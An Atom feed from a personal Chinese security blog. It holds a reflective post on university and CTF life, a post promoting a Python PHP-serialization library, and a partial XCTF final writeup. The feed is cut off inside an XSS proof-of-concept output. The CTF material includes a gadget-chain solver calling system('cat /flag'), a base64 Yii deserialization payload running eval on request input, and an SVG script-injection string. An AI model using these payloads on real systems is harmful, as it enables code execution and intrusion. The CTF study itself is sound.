<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Frank</title>
  
  
  <link href="https://blog.frankli.site/atom.xml" rel="self"/>
  
  <link href="https://blog.frankli.site/"/>
  <updated>2025-10-19T20:41:29.107Z</updated>
  <id>https://blog.frankli.site/</id>
  
  <author>
    <name>Frank Li</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于大学</title>
    <link href="https://blog.frankli.site/2022/07/03/Misc/%E5%85%B3%E4%BA%8E%E5%A4%A7%E5%AD%A6/"/>
    <id>https://blog.frankli.site/2022/07/03/Misc/%E5%85%B3%E4%BA%8E%E5%A4%A7%E5%AD%A6/</id>
    <published>2022-07-02T16:00:00.000Z</published>
    <updated>2025-10-19T20:41:29.107Z</updated>
    
    <content type="html"><![CDATA[<p>大学四年，做了些事。</p><h2 id="认识了XDSEC里的众大佬">认识了XDSEC里的众大佬</h2><p>记得在高中毕业后，俺作为学校六页高考排名中的最后一页上的人，上西电都是感觉稍有些悬。俺在西电的招生外场碰到了张宁老师，知道了西电的网络与信息安全学院，还云里雾里地参加了张老师带着16、17级学长办的第一届mssctf。当时作为一个垃圾算法选手，一道安全的题都没做出来，但是凭着垃圾算法基础还混了5k块钱。在赛后的宣讲会上pupile师傅将俺拉进了XDSEC招新群，在moeCTF上现学现卖，入门网络安全相关的知识，过程中还碰到了大学中认识的第一个同学konge，和他在moe榜单上🤺，还在线下见了家长（什么东西），最终成为了舍友（但似乎我并没有怎么回宿舍）。于是俺的大学便以XDSEC为线索展开了。</p><p>大一的时候俺就成天呆社团活动室（就说是实验室吧），甚至被导员给家长打了电话（但是后面导员似乎也放弃管我了2333），于是认识了睡在桌子底下的带带带能猫，认识了在mac上打300英雄的f1sh，认识了佛山富少w1nd，flight，去师傅… 成为了实验室守夜人之一（其实实验室离教室近【狡辩】）。</p><p>张老师带实验班，俺大一在垫底的软件工程，于是俺大二就靠实验班转了个专业。得益于我特殊的搜索技巧（至今自己都觉得离谱），俺在实验班机试里超了第二名一倍的分（呜呜呜对不起我真的忘了第二名是谁了对不起对不起），但是代价是俺的高数是补考过的。社团里18级的几个一直活跃着的同学最终基本都进了实验班。</p><p>大二期间，由于和学长们混得比较熟，又吃了些高中时期的技术的底子，成了XDSEC的2020年背锅人。俺作为一个自闭人，在到2021年四月的这一年时间里，硬是磕磕碰碰地向一些不认识的领导做了些报告，组织着社团的同学们做了些奇奇怪怪的事情（比如吃饭）。很多事情都是第一次做，有很多遗憾和尴尬，但是整体。。还行？感觉社团还的大方向没有太偏离就是最大的成功了，我觉得我选了逆向手Rx来接手XDSEC还是挺不错的一个选择（</p><h2 id="维护了几个学生组织的几个服务器">维护了几个学生组织的几个服务器</h2><p>大学期间，俺们社团随张老师办了三届的mssctf。每届mssctf俺们都搞了些新玩意玩。第二届俺们给CTFd写了个简陋的judge用来判算法题；第三届由于是线上赛，俺们给web题上了动态容器和腾讯的日志分析，可以看选手打的payload；第四届俺在新拿到的423活动室里拖着几个学弟用scapy写了些重组pcap中的tcp会话用的脚本，用来审计选手打pwn题的payload，顺便帮他们预习了下寄网，线下俺们又搞了一套能和CTFd配合运行的有时间限制的vnc+浏览器，让选手能在受控的网络环境下上网，让我们能盯着他们不要互相py，虽然由于网络设备不稳定运行得非常磕磕绊绊，但系统自身确实没出什么问题，很让人意外（</p><p>大三下，我突然来了些奇怪的兴致，维护了一段时间的开源社区的镜像和睿思的论坛，碰到了些奇奇怪怪的坑，写了些奇奇怪怪的代码。</p><p>俺给开源社区的机子换了个俺自己写的同步脚本，修了下git服务，在mirrorz群里潜水，后来又试图复苏开源<em>社区</em>，找人接手，后来高算中心的老师找到我说他们本来希望做个镜像站，发现开源社区已经做过了，遂在毕业之际将镜像站迁移到了高算中心的机房。顺便，我和网管会的学弟联了系，希望他们能恢复组织起社区真正的活动。</p><p>睿思的服务器也年久失修。19级的学弟刚接手便碰到了行政上的坑（毕竟是pt站…），需要将论坛和pt站分离开来。俺帮着迁移了下数据库，踩了踩mariadb自增int的坑，搭了搭新的pt站，也算是做了点微小的工作。</p><h2 id="参加了若干CTF比赛">参加了若干CTF比赛</h2><p>19年以前，俺和社团的众大佬一起玩一些线上的比赛，什么虎符啊，网鼎啊，XCTF啊，还有去了个究极尬的还要拍死亡黑照吊在学校大广告牌上示众的360WCTF，结果只能说是，比清华高（指倒数第三）。19年以来，疫情反复。然而我们还是有一些机会去一些线下赛。</p><p>印象深刻的比赛有：</p><h3 id="wctf">wctf</h3><p>应该是疫情前俺参与的唯一一场线下赛，场面宏大，宾馆豪华，还帮张老师给360的学长送了个小徽章，还和国外战队亲切交流（真的，在恰饭的时候和eat sleep pwn repeat的几个欧洲人【字面义】讨论他们的队伍名该怎么翻译成中文），非常的有意思。</p><h3 id="某次acm区域赛">某次acm区域赛</h3><p>当时和几个学长组了个队，打了或许是人生中的最后一场acm，毫不意外地打了铁。去比赛的路上因为买错了票，坐了12个小时的硬卧。</p><h3 id="国赛">国赛</h3><p>讲个笑话，ylb办awd</p><h3 id="bytectf">bytectf</h3><p>被鱼师傅的<a href="https://github.com/frank-dockerfiles/wallbreaker2020-reproduction">wallbreaker</a>按在地上打，在赛场上死活翻代码翻不出来什么所以然，还不敢上互联网。。。</p><h3 id="xctf-final">xctf final</h3><p>和学弟和happy去打，题目出人意料地都不难，平台虚拟化没做好可以逃逸（这现在可以说了吧。。。），报给了主办方。后来听说两个队因为逃了逸但是没上报导致成绩取消。<br>结束以后和诸葛老师合了影，可是找不到了呜呜呜呜呜</p><h2 id="写了些东西">写了些东西</h2><h3 id="CyanBot">CyanBot</h3><p>一开始俺还是酷Q噗肉的忠实用户，认识了rc和他写的cqhttp，直到酷Q倒了。后来看到了mirai和gocq，cqhttp也变成了onebot。cqhttp.Cyan一开始也就是俺大一的时候（当时俺还是软件工程专业）的某门课的大作业，但是一直以来在学生机上跑得还蛮稳定的，没做什么大的修改。直到现在还在跑俺的ctf通知bot以及自动回复。</p><p>CyanBot一开始写的契机是，当时俺还在软院科协，认识的是软院科协的众大佬：十三女装，尹大人，给俺安利了Celeste的炮哥哥，还有写了xindubot的心渡老师，当时他的bot跑在以webqq为基础的某python包之上，恰逢疼逊关闭了webqq，于是俺直接进行了一个自动回复bot的复现（核心科技：谢谢你，我学会了，你呢）。</p><h3 id="CTFd-Whale">CTFd &amp; Whale</h3><p>在使用CTFd的过程中给CTFd修了些奇怪的bug，还有一开始用在buuoj上的whale，glzjin维护到CTFdv2就不维护了，遂fork并继续维护。<br>在此过程中顺便帮助了挺多人搭建了CTFd with whale，包括一些私有靶场以及<a href="https://ctf.show">https://ctf.show</a>。</p><h3 id="etc">etc</h3><p>还有一些零零碎碎的小脚本。</p><h2 id="疫情">疫情</h2><p>我的大学的前一半与后一半被疫情隔了开来。COVID-19标记着中国社会的一个重大的转变。记得李文亮医生一开始发声之时，当时看着泄露出的紧急培训医生用的ppt，完全没有意识到后面事物的发展。两年半以来，疫情曾一次次地冲破了我和身边人的计划，也彻底地改变了无数人的生活（或许不是“负面”的改变？）。</p><p>疫情从暗流涌动，到大爆发，再到举社会之力动态清零，其政治属性不断加码。疫情本身拖垮了无数人的当下，政治化的疫情拖垮了无数人的未来。</p><h2 id="青可">青可</h2><p>从和青可在高中的相识已经过去了六年多。从高中时慢慢和青可建立起互相信任的关系，到大学时维持着长久的联系，再到一道前往上海……</p><h2 id="研">研</h2><p>上研与否，似乎成为了一个非常非常难以抉择的事情。</p><p>俺妈是博士后，从俺高中起就一直督促我：提高学历，才能不受制于人。这个道理显而易见：当下的分流政策指引着一切的社会地位的流动，而人才分流的一大手段便是<em>看学历</em>。其实俺妈最主要的论据还是上研能够有另一段能够自由学习的时间，去提高自己的科学以及社会素养。</p><p>俺认识的，熟悉的学长大多数直接出来工了作。俺周围的同学普遍来讲都认为上研并不能提升自己的能力，仅仅是换个地方打工罢了。</p><p>观察大多数上了研的，信安社团的，不是社团的学长学姐们，他们也一样迷茫，觉得累，觉得没有学到真正的东西，上研以后社会环境变得越来越差，难以找到工作；但我又明白他们所表露出来的或许不是他们真实的状态，又或许我所观察到的并不是常态。</p><p>看着落户政策里对待研究生与本科生巨大的差异，社会将人分开的残酷性是一定的了。但俺俩的<strong>幼稚</strong>又不允许我们在我向来不习惯的教育环境下虚度几年的时间。纠结着，被两边拖拽着，被海量的信息淹没着，俺们还是在迷茫中找了工作，没去上研。</p><p>俺们<em>随心所欲</em>了么？我觉得没有。我们还没来得及给自己给出答案。俺们没有一些工作了的学长的决绝，亦没有俺妈那样的阅历。或许，过两年俺们会被现实打醒回去考研吧。或许。又或许，我们会选另一条更显而易见的，仅剩的路？</p><h2 id="以及很多其他的重要的事与人">以及很多其他的重要的事与人</h2><p>我长久以来未曾写过些什么文字，现在也不会写。我想到些什么，便罗列在上面了。后面的几周或许会写些别的，或许不会。只是写给自己看罢了。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;大学四年，做了些事。&lt;/p&gt;
&lt;h2 id=&quot;认识了XDSEC里的众大佬&quot;&gt;认识了XDSEC里的众大佬&lt;/h2&gt;
&lt;p&gt;记得在高中毕业后，俺作为学校六页高考排名中的最后一页上的人，上西电都是感觉稍有些悬。俺在西电的招生外场碰到了张宁老师，知道了西电的网络与信息安全学院，还云</summary>
      
    
    
    
    
    <category term="Misc" scheme="https://blog.frankli.site/tags/Misc/"/>
    
    <category term="小结" scheme="https://blog.frankli.site/tags/%E5%B0%8F%E7%BB%93/"/>
    
    <category term="life" scheme="https://blog.frankli.site/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>python实现的php序列化</title>
    <link href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/"/>
    <id>https://blog.frankli.site/2021/06/15/Misc/libphpserialize/</id>
    <published>2021-06-14T16:00:00.000Z</published>
    <updated>2021-06-15T06:43:53.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>就单纯想推销一下<a href="https://github.com/frankli0324/libphpserialize">libphpserialize</a></p></blockquote><h2 id="如何用Python实现PHP的序列化">如何用Python实现PHP的序列化</h2><ol><li>脑补</li><li>写代码</li></ol><h2 id="如何使用libphpserialize">如何使用libphpserialize</h2><h3 id="安装">安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install libphpserialize</span><br></pre></td></tr></table></figure><h3 id="使用">使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="built_in">print</span>(serialize(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>非常银杏方便</p><h2 id="为什么不用php自己的serialize？">为什么不用php自己的serialize？</h2><ol><li>不用在你的电脑上安装php</li><li>python有requests/httpx，php没有</li><li>简化做题流程</li></ol><p>想象一下这样的场景：</p><p>你在打一个比赛，在做一道反序列化相关的题目。你启动了一个定时销毁的容器，这个容器限时一个小时。你在第50分钟的时候找到了合适的pop链，并用5分钟用python写出了触发反序列化的python poc。</p><p>你慌忙地打开了一个新的文件，将类的定义拷贝了过来，给他们赋了各种属性，然后<code>echo serialize($obj);</code>，结果发现有个private属性，于是又慌忙地改成了 <code>echo urlencode(serialize($obj));</code>，又在命令行中 <code>php generate.php</code>，复制，粘贴进python脚本，执行脚本，最后发现题目里头的反序列化入口处他 <code>base64_decode</code> 了一下，于是又回头去将 <code>urlencode</code> 改成 <code>base64_encode</code>，复制，粘贴，执行python脚本，运行，502，你很愤怒，用浏览器去访问了一下这个链接，发现容器已经过期了。你人麻了。</p><img src="/2021/06/15/Misc/libphpserialize/timeout.png" class=""><p>再想象一下这样的场景：</p><p>你已经成功地构造好了pop链，但是这个链非常长，而且需要精巧地构造属性值。你觉得用python构造这样的属性最简单，但是又不得不print出来然后粘贴到php代码里。你构造好了 <code>system('cat /flag');</code> 的payload，结果发现出题人在 <code>disable_functions</code> 中禁用了system函数。你不得不重新来一遍整个流程，构造属性，复制粘贴，生成序列化串，将序列化串粘回到python脚本里，请求。可是你突然发现你构造出来的序列化后的串突然用不了了，你找了10分钟，最后发现由于终端输出的字符数量限制，你只复制了一半。你非常气愤，直接在python脚本里 <code>payload = input()</code>，然后直接用管道符运行 <code>php generate.php | python3 exp.py</code>，结果发现仍然打不通。你又找了半天，发现php代码里用于调试的几个var_dump没有删。你一怒之下关闭了vscode，打开了LOL，找几个憨批进行一个人的祖安，还破坏了他人的游戏体验。</p><img src="/2021/06/15/Misc/libphpserialize/defeat.jpeg" class=""><p>再想象一下：</p><p>你的队友找到了一条pop链，但是二话不说给你发过来这样一串谜语</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=site%2Fabout&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MzI6InlpaVxjYWNoaW5nXEV4cHJlc3Npb25EZXBlbmRlbmN5IjoxOntzOjEwOiJleHByZXNzaW9uIjtzOjIzOiJldmFsKCRfUkVRVUVTVFsiYW50Il0pOyI7fWk6MTtzOjE4OiJldmFsdWF0ZURlcGVuZGVuY3kiO319fQo=&amp;ant=phpinfo();</span><br></pre></td></tr></table></figure><p>你的眼睛都要看瞎了，可是你访问了这个url，竟然真的打通了。你接下来想继续往进探一探，于是打开了hackbar，痛苦地一个字符一个字符地去改。你题做完了，眼睛也废了。结果你的憨批队友又不想写wp，想让你来写。你想打游戏，于是也贴了这么一大长串。评论区生气了，说你这谁**看得懂。</p><p>如果你有类似的经历，那你可以用libphpserialize来拯救你快乐的一天。</p><h2 id="示例">示例</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        强网杯2021，pop_master    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> phply <span class="keyword">import</span> phplex</span><br><span class="line"><span class="keyword">from</span> phply.phpast <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> phply.phpparse <span class="keyword">import</span> make_parser</span><br><span class="line"></span><br><span class="line">ses = session()</span><br><span class="line">classes = &#123;&#125;</span><br><span class="line">func2class = &#123;&#125;</span><br><span class="line">parser = make_parser()</span><br><span class="line">good_paths = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;class.php&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lexer = phplex.lexer.clone()</span><br><span class="line">    ast = parser.parse(file.read(), lexer=lexer)</span><br><span class="line">    <span class="keyword">for</span> cls <span class="keyword">in</span> ast:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cls.nodes:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Method:</span><br><span class="line">                func2class[i.name] = cls.name</span><br><span class="line">        classes[cls.name] = cls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_good_assign</span>(<span class="params">ctx_param, node: Assignment</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(node) == Assignment</span><br><span class="line">    <span class="keyword">if</span> ctx_param.name == node.node.name:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(node.expr) == BinaryOp:</span><br><span class="line">            <span class="keyword">if</span> node.expr.op == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> node.expr.left.name == ctx_param.name:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(node)</span><br><span class="line">                <span class="comment"># unexpected</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(node.expr) == Variable:</span><br><span class="line">            <span class="keyword">if</span> node.expr.name == ctx_param.name:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_if</span>(<span class="params">ctx_param, node: If</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">type</span>(node) == If</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(node.expr) <span class="keyword">is</span> BinaryOp:</span><br><span class="line">        <span class="comment"># debug</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">str</span>(node.expr.left)+node.expr.op+<span class="built_in">str</span>(node.expr.right)):</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> node.node.nodes:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(n) <span class="keyword">is</span> Assignment <span class="keyword">and</span> <span class="keyword">not</span> is_good_assign(ctx_param, n):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(node.expr) <span class="keyword">is</span> FunctionCall:</span><br><span class="line">        <span class="keyword">if</span> node.expr.name == <span class="string">&#x27;method_exists&#x27;</span>:</span><br><span class="line">            func = node.expr.params[<span class="number">1</span>].node</span><br><span class="line">            <span class="keyword">assert</span>(<span class="built_in">type</span>(func) == <span class="built_in">str</span>)</span><br><span class="line">            search(classes[func2class[func]],</span><br><span class="line">                   node.expr.params[<span class="number">0</span>].node.name, func)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;unexpected call&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;unexpected expr&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_method</span>(<span class="params">ctx, method</span>):</span><br><span class="line">    ctx.param = method.params[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> method.nodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> For:</span><br><span class="line">            <span class="keyword">for</span> n <span class="keyword">in</span> i.node.nodes:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(n) <span class="keyword">is</span> Assignment <span class="keyword">and</span> <span class="keyword">not</span> is_good_assign(method.params[<span class="number">0</span>], n):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> If:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> handle_if(method.params[<span class="number">0</span>], i):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> MethodCall:</span><br><span class="line">            search(classes[func2class[i.name]], i.node.name, i.name)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Assignment:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_good_assign(method.params[<span class="number">0</span>], i):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Eval:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">node, attr, method, path=[]</span>):</span><br><span class="line">    path.append((node, attr, method))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> node.nodes:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">is</span> Method <span class="keyword">and</span> i.name == method:</span><br><span class="line">            ctx = <span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>, (<span class="built_in">object</span>,), &#123;&#125;)()</span><br><span class="line">            <span class="keyword">if</span> handle_method(ctx, i):</span><br><span class="line">                good_paths.append(<span class="built_in">list</span>(path))</span><br><span class="line">    path.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">good_paths = []</span><br><span class="line">search(classes[<span class="string">&#x27;dLEWX3&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;L8IHXt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(good_paths))</span><br><span class="line"><span class="keyword">for</span> n, a, m <span class="keyword">in</span> good_paths[<span class="number">0</span>]:</span><br><span class="line">    <span class="built_in">print</span>(n.name, a, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prop_call</span>(<span class="params">parent, attr, cls</span>):</span><br><span class="line">    <span class="built_in">setattr</span>(parent, attr, <span class="built_in">type</span>(cls, (<span class="built_in">object</span>,), &#123;&#125;)())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">getattr</span>(parent, attr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = <span class="built_in">type</span>(<span class="string">&#x27;dLEWX3&#x27;</span>, (<span class="built_in">object</span>,), &#123;&#125;)()</span><br><span class="line">node = root</span><br><span class="line">path = good_paths[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(path)):</span><br><span class="line">    node = prop_call(node, path[i][<span class="number">1</span>], path[i][<span class="number">0</span>].name)</span><br><span class="line"><span class="built_in">print</span>(serialize(root))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ses.get(<span class="string">&#x27;http://my_instance.cloudeci1.ichunqiu.com/&#x27;</span>, params=&#123;</span><br><span class="line">    <span class="string">&#x27;pop&#x27;</span>: serialize(root),</span><br><span class="line">    <span class="string">&#x27;argv&#x27;</span>: <span class="string">&#x27;system(&quot;cat /flag&quot;); //&#x27;</span>,</span><br><span class="line">&#125;).text)</span><br></pre></td></tr></table></figure>    </div></div><p>这道题需要解析php源码的ast，并且进行搜索，去掉不可用的假链，找到唯一的一条真链。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        CTFHUB framework    </div>    <div class='spoiler-content'>        <img src="/2021/06/15/Misc/libphpserialize/yii.jpg" class="">    </div></div><p>这道题是一道比较常规的框架反序列化，payload需要base64_encode后发送</p><p>WIP</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;就单纯想推销一下&lt;a href=&quot;https://github.com/frankli0324/libphpserialize&quot;&gt;libphpserialize&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;如何用Python实现PH</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://blog.frankli.site/tags/CTF/"/>
    
    <category term="Toy" scheme="https://blog.frankli.site/tags/Toy/"/>
    
  </entry>
  
  <entry>
    <title>第六届XCTF决赛部分Writeup</title>
    <link href="https://blog.frankli.site/2021/05/30/Security/Writeup/XCTF-Final-2021/"/>
    <id>https://blog.frankli.site/2021/05/30/Security/Writeup/XCTF-Final-2021/</id>
    <published>2021-05-29T16:00:00.000Z</published>
    <updated>2025-10-19T20:33:35.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Prologue">Prologue</h2><p>这应该是我个人最近最后一场比赛了，整体而言挺开心的，还和诸葛老师合了影（</p><h2 id="dngs2010">dngs2010</h2><p>由于源码里摆明了让我们去选svg，那我们就去选svg。<br>在返回的页面中，我们能看到我们输入的内容被这样拼接进了html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;10&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">&quot;http://q1.qlogo.cn/g?b=qq&amp;nk=&#123;input&#125;&amp;s=640&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p>继续浏览题目，发现选择二进制格式进行生成时除了像素低一点别的都一样，联想到题目中的selenium，不难猜到后段是用chrome渲染svg然后截图。多试几次就能发现，我们的输入位于 <code>/img/</code> 后的url中，程序取最后一个 <code>.</code> 前的内容作为输入，之后的内容作为生成方式。<br>自然而言，我们就是要打这个selenium了，不管怎么样先得xss，自然而言就得闭合标签。然而这里基本什么过滤都没有，非常舒适。</p><p>proof of concept:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(ses.get(<span class="string">&#x27;http://172.35.6.36:3000/img/745679136&quot; style=&quot;height:0&quot;&gt;&#x27;</span>+quote(<span class="string">f&#x27;&#x27;&#x27;&lt;/image&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;console.log(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;&#x27;&#x27;&#x27;</span>, safe=<span class="string">&#x27; &lt;&gt;&#x27;</span>)+<span class="string">&#x27;.svg&#x27;</span>).text)</span><br></pre></td></tr></table></figure><p>result:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;480px&quot;</span> <span class="attr">height</span>=<span 